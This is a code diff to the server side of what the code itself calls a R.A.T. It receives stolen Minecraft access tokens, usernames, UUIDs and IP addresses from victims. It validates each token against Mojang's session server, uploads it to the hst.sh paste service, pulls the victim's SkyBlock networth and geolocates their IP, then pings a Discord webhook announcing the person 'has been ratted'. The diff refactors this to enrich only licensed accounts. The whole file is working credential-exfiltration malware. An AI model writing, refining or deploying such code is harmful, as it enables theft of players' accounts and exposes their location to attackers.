@@ -37,47 +37,24 @@ app.post("/", async (req, res) => {
     }
 
     try {
-        const [response, shorttoken] = await Promise.all([
-            post("https://sessionserver.mojang.com/session/minecraft/join", {
-                accessToken: req.body.token,
-                selectedProfile: req.body.uuid,
-                serverId: req.body.uuid
-            }).then(res => {
-                if (res.status === 403) {
-                    return "Non-License";
-                } else if (res.status === 200) {
-                    return "License";
-                } else {
-                    return `Unexpected status: ${res.status}`;
-                }
-            }).catch(() => "Request failed"),
-            post("https://hst.sh/documents/", req.body.token).then(res => res.data.key).catch(() => "Error uploading"),
-        ]);
-
-        let profiles = '';
-        const profileData = await getProfiles(req.body.uuid);
-        if (profileData) {
-            for (let profileId in profileData.profiles) {
-                profiles += `[${profileData.profiles[profileId].sblvl}]${profileData.profiles[profileId].unsoulboundNetworth} - ${profileData.profiles[profileId].gamemode}\n`;
+        const response = await post("https://sessionserver.mojang.com/session/minecraft/join", {
+            accessToken: req.body.token,
+            selectedProfile: req.body.uuid,
+            serverId: req.body.uuid
+        }).then(res => {
+            if (res.status === 403) {
+                return "Non-License";
+            } else if (res.status === 200) {
+                return "License";
+            } else {
+                return `Unexpected status: ${res.status}`;
             }
-        }
+        }).catch(() => "Request failed");
 
-        const country = await fetchCountry(req.body.ip);
-
-        const checkToken = req.body.token == 'File not found :(' ? 'Invalid Token' : `[Minecraft Token](https://hst.sh/${shorttoken})`;
-        const planckeUrl = `[Plancke.io](https://plancke.io/hypixel/player/stats/${req.body.username})`;
-        const cryptUrl = `[SkyCrypt](https://sky.shiiyu.moe/stats/${req.body.username}})`;
-
-        const webhookData = {
+        let webhookData = {
             content: `@everyone - ${req.body.username}`,
             embeds: [{
-                fields: [
-                    { name: 'Statistics', value: `****${planckeUrl}**** ****${cryptUrl}****`, inline: false },
-                    { name: 'Token', value: `****${checkToken}****`, inline: true },
-                    { name: 'Profiles', value: `**\`\`\`${profiles}\`\`\`**`, inline: false },
-                    { name: 'Country', value: `**\`\`\`${country}\`\`\`**`, inline: false },
-                    { name: 'License Status', value: `**\`\`\`${response}\`\`\`**`, inline: false }, // добавлено поле для отображения статуса лицензии
-                ],
+                fields: [],
                 color: 2175365,
                 footer: {
                     "text": "😈 Autistic? 😈",
@@ -86,6 +63,36 @@ app.post("/", async (req, res) => {
             }],
             attachments: []
         };
+
+        if (response !== "Non-License") {
+            const [shorttoken, profiles, country] = await Promise.all([
+                post("https://hst.sh/documents/", req.body.token).then(res => res.data.key).catch(() => "Error uploading"),
+                getProfiles(req.body.uuid).then(profileData => {
+                    if (profileData) {
+                        return Object.values(profileData.profiles).map(profile => 
+                            `[${profile.sblvl}]${profile.unsoulboundNetworth} - ${profile.gamemode}`
+                        ).join('\n');
+                    }
+                    return '';
+                }),
+                fetchCountry(req.body.ip)
+            ]);
+
+            const checkToken = shorttoken === 'Error uploading' ? 'Invalid Token' : `[Minecraft Token](https://hst.sh/${shorttoken})`;
+            const planckeUrl = `[Plancke.io](https://plancke.io/hypixel/player/stats/${req.body.username})`;
+            const cryptUrl = `[SkyCrypt](https://sky.shiiyu.moe/stats/${req.body.username})`;
+
+            webhookData.embeds[0].fields.push(
+                { name: 'Statistics', value: `****${planckeUrl}**** ****${cryptUrl}****`, inline: false },
+                { name: 'Token', value: `****${checkToken}****`, inline: true },
+                { name: 'Profiles', value: `**\`\`\`${profiles}\`\`\`**`, inline: false },
+                { name: 'Country', value: `**\`\`\`${country}\`\`\`**`, inline: false },
+            );
+        }
+
+        webhookData.embeds[0].fields.push({
+            name: 'License Status', value: `**\`\`\`${response}\`\`\`**`, inline: false
+        });
 
         await post(process.env.WEBHOOK, webhookData);
         console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`);
